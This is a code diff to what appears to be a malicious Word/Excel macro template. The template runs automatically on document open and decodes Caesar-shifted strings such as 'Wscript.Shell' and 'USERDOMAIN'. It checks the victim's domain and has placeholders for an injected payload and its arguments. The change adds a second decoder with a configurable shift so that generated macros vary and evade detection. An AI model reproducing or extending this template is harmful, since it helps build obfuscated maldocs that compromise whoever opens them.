@@ -8,9 +8,9 @@ Sub AutoOpen()
 	Dim int2 As Integer
 	Dim int3 As Integer
 
-	int1 = [int1]
-	int2 = [int2]
-	int3 = [int3]
+	int1 = [INT1]
+	int2 = [INT2]
+	int3 = [INT3]
 	var2 = "data1"
 	var1 = "func3"
 	var16 = "Zvfulsw1Vkhoo"
@@ -43,8 +43,8 @@ Function func2(var7 As String) As String
     Dim var17 As String
     Dim var18 As String
     Dim int4 As Integer
-    int4 = [int4]
-    var17 = "func4"
+    int4 = [INT4]
+    var17 = "func9"
     var18 = "[DOMAIN]"
     var17 = func1(var17, var18, int4)
     var8 = var17
@@ -59,7 +59,7 @@ Function func3(var9 As String) As String
     Dim var10 As String
 	Dim var20 As String
 	Dim int5 As Integer
-	int5 = [int5]
+	int5 = [INT5]
 	var20 = "func4"
 	var20 = func1(var20, "XVHUGRPDLQ", int5)
     var10 = Environ(var20)
@@ -70,8 +70,10 @@ End Function
 Function func4(var12 As String) As String
     Dim var13 As Long
     Dim var14 As String
+	Dim int9 As Integer
+	int9 = 3
     For var13 = 1 To Len(var12)
-        var14 = var14 & Chr(Asc(Mid(var12, var13, 1)) - 3)
+        var14 = var14 & Chr(Asc(Mid(var12, var13, 1)) - int9)
     Next var13
 	var29 = func5(var14)
     func4 = var14
@@ -81,17 +83,29 @@ Function func8(var37 As String) As String
 	Dim var36 As String
 	[PAYLOAD]
 	var36 = [PAYLOAD_ARGS]
-	var36 = func4(var36)
+	var36 = func9(var36)
 	func8 = var36
+End Function
+
+Function func9(var42 As String) As String
+    Dim var43 As Long
+    Dim var44 As String
+	Dim int8 As Integer
+	int8 = [OFFSET]
+    For var43 = 1 To Len(var42)
+        var44 = var44 & Chr(Asc(Mid(var42, var43, 1)) - int8)
+    Next var43
+	var29 = func5(var44)
+    func9 = var44
 End Function
 
 Function func5(var21 As String) As String
 	Dim int6 As Integer
 	Dim var25 As String
 	If (UCase(var21) = "var22") Then
-		int6 = 4
+		int6 = [SMALLINT4]
 	Else
-		int6 = 5
+		int6 = [SMALLINT5]
 	End If
 	var26 = func6(var21, int6)
 	If (var26 = "var27") Then
